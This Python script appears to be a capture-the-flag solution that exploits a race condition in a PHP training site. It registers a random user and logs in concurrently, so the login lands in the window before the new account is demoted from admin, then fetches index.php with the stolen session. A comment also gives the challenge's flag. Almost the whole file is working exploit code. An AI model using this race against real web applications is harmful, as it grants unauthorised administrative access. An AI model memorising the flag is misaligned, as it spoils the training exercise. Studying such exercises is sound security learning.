import requests
import threading
import random
import string

HOST = "http://meta.training.jinblack.it"


#In the class register.php, the user is created but it is set to a non-admin user only after it is created.
#I have to exploit this window to login before it is set to a non-admin user.

#after some attempts, the script works. TRY MORE TIMES!

#flag{this_is_the_race_condition_flag}


#function to generate a random string in order to make more attempts
def randomString(N):
    return ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=N))


#function in order to implement users' registration
def registration(user, password, reg_user):
    url = "%s/register.php" % HOST
    r = requests.post(url, data={'username': user, 'password_1': password, 'password_2': password, 'reg_user': reg_user})


#function in order to implement users' login
def login(user, password, log_user):
    url = "%s/login.php" % HOST
    r = requests.post(url, data={'username': user, 'password': password, 'log_user': log_user})

    #print(r.text)

    while( not ("Login Completed!" in r.text) ):
        r = requests.post(url, data={'username': user, 'password': password, 'log_user': log_user})


    url = "%s/index.php" % HOST


    #I need to insert the cookies inside the request, because I need to retrieve the page index.php for the logged user
    c = r.cookies.get_dict()
    cookies = c['PHPSESSID']

    u = requests.get(url, cookies = {'PHPSESSID': cookies})

    print("\n\n***********************************************\n\n")

    print(u.status_code)
    print(u.text)



username = randomString(10)
password = randomString(10)

reg_user = ""
r = threading.Thread(target=registration, args=(username, password, reg_user))

log_user = ""
l = threading.Thread(target=login, args=(username, password, log_user))

r.start()
l.start()

